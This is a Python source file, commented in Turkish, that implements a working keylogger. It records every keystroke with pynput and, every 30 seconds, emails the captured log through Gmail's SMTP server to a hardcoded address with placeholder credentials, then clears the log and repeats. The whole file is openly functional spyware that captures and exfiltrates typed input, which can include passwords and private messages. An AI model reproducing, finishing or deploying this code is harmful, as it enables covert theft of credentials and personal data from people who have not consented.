import pynput.keyboard
import smtplib
import threading

log = ""

def callback_function(key): #Bu fonksiyon, klavyeden bir tuşa basıldığında çağrılır. key parametresi, basılan tuşu temsil eder.
    global log
    try:
        #log = log + key.char.encode('utf-8')
        log = log + str(key.char)
    except AttributeError: # bir nesnenin belirtilen bir özelliğe veya niteliğe sahip olmadığı zaman ortaya çıkan bir hata türüdür. key.char ozelliginde degilse..
        if key == key.space:
            log = log + " "
        else:
            log = log + str(key)
    except:
        pass

    print(log)

def send_email(email,password,message):
    email_server = smtplib.SMTP("smtp.gmail.com",587) #smtp sunucusuna baglanma
    email_server.starttls() #Bağlantı üzerinden TLS şifrelemesini başlatır. Bu, iletişimin güvenli olmasını sağlar.
    email_server.login(email,password)
    email_server.sendmail(email,email,message)
    email_server.quit() #smtp sunucusuna baglantiyi kapatma

#thread - threading

def thread_function():
    global log
    send_email("user@gmail.com", "password", log.encode('utf-8'))
    log = ""
    timer_object = threading.Timer(30,thread_function) #threading timer kullanarak 30 saniyede bir bu işlevi tekrar çağırır.
    timer_object.start()


keylogger_listener = pynput.keyboard.Listener(on_press=callback_function) # bir tusa basildiginda callback fonk'u calisir.
with keylogger_listener:#Bu ifade, keylogger_listener nesnesini bir "context manager" olarak kullanmamızı sağlar. Yani, bu bloğun içindeki
                        # işlemler keylogger_listener nesnesine ait olduğu sürece geçerli olacaktır. Bu durumda, klavye olaylarını dinlemek için Listener nesnesini kullanırken,
                        # keylogger_listener nesnesinin doğru şekilde sonlandırılmasını sağlar.
    thread_function()
    keylogger_listener.join() #join metodu özellikle threading modülünde kullanılan bir metottur. 
    #Bu metod, bir thread'in diğer thread'in bitmesini beklemek için kullanılır.
    # Bu ifade, klavye dinleme işleminin bitmesini bekler.
